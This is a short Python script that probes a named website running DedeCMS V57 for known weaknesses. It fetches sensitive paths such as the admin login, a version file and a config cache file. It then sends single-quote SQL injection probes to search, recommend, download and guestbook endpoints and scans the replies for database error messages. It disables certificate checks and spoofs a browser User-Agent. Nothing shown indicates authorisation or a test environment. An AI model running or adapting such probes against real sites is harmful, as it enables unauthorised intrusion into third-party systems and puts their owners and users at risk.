#!/usr/bin/env python3
"""jhnew DedeCMS V57 frontend vuln probes"""
import urllib.request, urllib.parse, re

UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "Accept": "*/*"}
HOST = "https://www.jhnew.com"

def fetch(url, timeout=10, data=None):
    try:
        req = urllib.request.Request(url, data=data.encode() if data else None,
                                     headers={**UA, "Content-Type": "application/x-www-form-urlencoded"})
        ctx = urllib.request.ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = urllib.request.ssl.CERT_NONE
        r = urllib.request.urlopen(req, timeout=timeout, context=ctx)
        return r.status, r.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, e.read(5000).decode("utf-8", "ignore")
    except Exception as ex:
        return 0, str(ex)

# DedeCMS V57 known paths + vulns
print("=== V57 paths ===")
for p in ["/plus/search.php?keyword=test", "/member/index.php", "/plus/download.php?aid=1",
          "/plus/flink.php", "/data/admin/ver.txt", "/dede/login.php", "/plus/guestbook.php",
          "/plus/recommend.php", "/tags.php", "/include/config.cache.inc.php",
          "/plus/carbuyaction.php?dopost=add"]:
    code, body = fetch(HOST + p)
    print("  %s: %s size=%d" % (p[:45], code, len(body)), flush=True)

# SQLi probes (V57 front)
print("\n=== SQLi ===")
tests = [
    ("/plus/search.php?keyword=1%27", "search"),
    ("/plus/recommend.php?aid=1%27", "recommend"),
    ("/plus/download.php?aid=1%27", "download"),
    ("/plus/guestbook.php?an=1%27", "guestbook"),
]
for p, tag in tests:
    code, body = fetch(HOST + p)
    sqlerr = re.findall(r'(SQL syntax|mysql_fetch|Unclosed quotation|You have an error|SQLSTATE)', body, re.I)
    print("  %s: %s size=%d sqlerr=%d %s" % (tag, code, len(body), len(sqlerr), sqlerr[:1] if sqlerr else ""))
